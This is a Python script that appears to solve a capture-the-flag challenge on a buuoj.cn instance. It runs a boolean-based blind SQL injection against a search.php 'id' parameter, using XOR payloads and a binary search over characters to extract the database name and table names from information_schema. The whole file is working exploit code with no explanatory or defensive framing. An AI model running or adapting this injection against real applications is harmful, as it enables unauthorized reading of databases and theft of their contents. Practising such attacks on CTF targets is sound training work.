#!/usr/bin/env python3
import requests
import time

URL = "http://68321904-15be-4b49-9f6a-508fbe5d863a.node5.buuoj.cn:81/search.php"
DELAY = 0.5

def blind_extract(query, max_len=50):
    """Extract string using binary search"""
    result = ""

    # First find length
    for length in range(1, max_len + 1):
        payload = f"1^(length({query})={length})"
        r = requests.get(URL, params={"id": payload}, timeout=10)
        time.sleep(DELAY)

        if "ERROR" in r.text:
            print(f"[+] Length of {query}: {length}")
            break

    # Extract each character using binary search
    for pos in range(1, length + 1):
        low = 32
        high = 127

        while low < high:
            mid = (low + high) // 2
            payload = f"1^(ascii(substr({query},{pos},1))>{mid})"
            r = requests.get(URL, params={"id": payload}, timeout=10)
            time.sleep(DELAY)

            if "ERROR" in r.text:  # True condition
                low = mid + 1
            else:  # False condition
                high = mid

        char = chr(low)
        result += char
        print(f"[+] Extracted: {result}")

    return result

# Extract database name
print("[*] Extracting database name...")
db_name = blind_extract("database()")
print(f"[+] Database: {db_name}")

# Extract tables
print("[*] Extracting table names...")
tables_query = "(select group_concat(table_name) from information_schema.tables where table_schema=database())"
tables = blind_extract(tables_query)
print(f"[+] Tables: {tables}")